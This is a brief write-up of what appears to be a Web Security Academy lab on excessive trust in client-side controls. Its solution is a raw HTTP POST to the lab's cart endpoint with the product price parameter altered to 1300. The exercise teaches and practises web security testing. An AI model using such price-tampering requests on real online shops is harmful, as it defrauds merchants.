# Lab: Excessive trust in client-side controls
## Description
Simply change the price of the product, before adding it to the cart.

## Solution
```yaml
POST /cart HTTP/1.1
Host: acf81f4f1f3a101ac03303740011002c.web-security-academy.net
Content-Length: 47

productId=1&redir=PRODUCT&quantity=1&price=1300
```